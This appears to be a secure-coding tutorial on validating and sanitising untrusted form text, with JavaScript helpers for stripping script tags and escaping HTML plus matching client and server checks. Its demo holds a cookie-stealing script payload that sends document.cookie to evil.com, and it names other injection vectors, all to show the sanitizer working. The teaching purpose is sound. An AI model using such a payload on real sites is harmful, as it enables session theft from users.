# Problem: Input validation/sanitization for untrusted user text

**Task:** Implement a validation/sanitization layer for a form field that accepts free-text user input (e.g., a display name or short bio), stripping `<script>` tags and escaping HTML entities, with matching client-side (UX) and server-side (actual enforcement) checks.

## Sanitization helpers

```js
/**
 * Removes <script>...</script> blocks entirely (including their content).
 * This is a first-pass defense, NOT a substitute for output escaping --
 * it exists to strip the most obviously dangerous payload shape before
 * the value is ever stored, on top of (not instead of) escaping on render.
 */
function stripScriptTags(input) {
  return input.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, "");
}

/**
 * Escapes HTML-significant characters so the string is always safe to
 * insert into an HTML text context (e.g., via innerHTML or a template engine).
 */
function escapeHtml(input) {
  return input
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function sanitizeUserText(rawInput) {
  const withoutScripts = stripScriptTags(rawInput);
  return escapeHtml(withoutScripts).trim();
}
```

## Validation rules (structure/length, not just "is it dangerous")

```js
function validateDisplayName(rawInput) {
  const errors = [];
  const value = typeof rawInput === "string" ? rawInput.trim() : "";

  if (value.length === 0) errors.push("Display name is required.");
  if (value.length > 40) errors.push("Display name must be 40 characters or fewer.");
  if (/[<>]/.test(value)) errors.push("Display name cannot contain angle brackets.");

  return { valid: errors.length === 0, errors, value };
}
```

## Client-side usage (UX only — instant feedback)

```js
form.addEventListener("submit", (event) => {
  const raw = nameInput.value;
  const { valid, errors } = validateDisplayName(raw);

  if (!valid) {
    event.preventDefault();
    showErrors(errors); // instant feedback, no round trip
    return;
  }
  // Even though it "looks valid" client-side, we do NOT trust it --
  // the real check happens again below, server-side.
});
```

## Server-side usage (the check that actually matters)

```js
// Node/Express-style, illustrative -- this is the enforcement boundary.
app.post("/profile", (req, res) => {
  const { valid, errors, value } = validateDisplayName(req.body.displayName);
  if (!valid) {
    return res.status(400).json({ errors });
  }

  const sanitized = sanitizeUserText(value);
  saveDisplayName(req.session.userId, sanitized); // safe to store and later render
  res.status(200).json({ displayName: sanitized });
});
```

```js
// Demo of the sanitizer against a malicious payload:
const attackerInput = "Hi <script>fetch('https://evil.com/steal?c='+document.cookie)</script> there";
console.log(sanitizeUserText(attackerInput));
// "Hi  there" -- script block removed entirely, remaining text HTML-escaped
```

## Key points this demonstrates

- Validation (is this input well-formed and within acceptable rules?) and sanitization (make this input safe to store/render even if it isn't) are related but distinct — you generally want both.
- The client-side version exists purely for instant UX feedback (see `../theory/06-client-side-validation-is-not-security.md`) and must never be trusted; the server re-runs the exact same logic and is the only check that actually protects the system.
- Stripping `<script>` tags is a reasonable first pass but is not a complete defense on its own — always escape (or sanitize with an allowlist library, for genuine rich-text cases) on top of it, since there are many non-`<script>` injection vectors (`<img onerror>`, `<svg onload>`, etc.) that simple tag-stripping alone won't catch.
